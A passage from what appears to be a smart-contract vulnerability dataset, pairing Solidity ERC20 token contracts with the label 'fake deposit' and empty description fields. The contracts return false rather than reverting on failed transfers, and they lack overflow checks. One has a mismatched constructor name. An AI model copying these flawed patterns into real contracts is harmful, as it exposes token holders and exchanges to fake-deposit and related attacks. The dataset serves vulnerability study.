        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract CryptoCoin is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is CryptoCoin {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 5000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 5000000000;                        // Update total supply (100000 for example)\r\n        name = \"CryptoCoin\";                                   // Set the name for display purposes\r\n        decimals = 1;                            // Amount of decimals for display purposes\r\n        symbol = \"CCO\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n            if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n            if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract Nabla is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\nfunction ERC20Token(\r\n) {\r\nbalances[msg.sender] = 10000000000; // Give the creator all initial tokens (100000 for example)\r\ntotalSupply = 10000000000; // Update total supply (100000 for example)\r\nname = \"Nabla\"; // Set the name for display purposes\r\ndecimals = 8; // Amount of decimals for display purposes\r\nsymbol = \"NBL\"; // Set the symbol for display purposes\r\n}\r\n \r\n/* Approves and then calls the receiving contract */\r\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\nallowed[msg.sender][_spender] = _value;\r\nApproval(msg.sender, _spender, _value);\r\n \r\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n//receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n//it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\nreturn true;\r\n}\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //Name of the token\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n    string public symbol;                 //An identifier: eg AXM\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 9900000000000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 9900000000000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Fenny Penny\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals\r\n        symbol = \"FPN\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.9.0;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract HARAMBUCKS is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function HARAMBUCKS(\r\n        ) {\r\n        balances[msg.sender] = 6942000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 6942000000;                        // Update total supply (100000 for example)\r\n        name = \"HARAMBUCKS\";                                   // Set the name for display purposes\r\n        decimals = 5;                            // Amount of decimals for display purposes\r\n        symbol = \"MONKE\";                               // Set the symbol for display purposes\r\n       \r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 50000000;                        // Update total supply (100000 for example)\r\n        name = \"IonicTransfertToken\";                                   // Set the name for display purposes\r\n        decimals = 0;                            // Amount of decimals for display purposes\r\n        symbol = \"ITT\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.25;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n    \r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n     \r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract Shepherd is StandardToken { \r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                  \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'Shepherd.0'; \r\n    uint256 public unitsOneEthCanBuy;     \r\n    uint256 public totalEthInWei;         \r\n    address public fundsWallet;           \r\n\r\n   \r\n    function Shepherd() {\r\n        balances[msg.sender] = 10000000000000000000000000000;               \r\n        totalSupply = 10000000000000000000000000000;\r\n        name = \"Shepherd\";\r\n        decimals = 18;                                               \r\n        symbol = \"Shepherd\";                                             \r\n        unitsOneEthCanBuy = 0;          //7% bonus= OneEth//                           \r\n        fundsWallet = msg.sender;                                    \r\n    }\r\n\r\n    function() 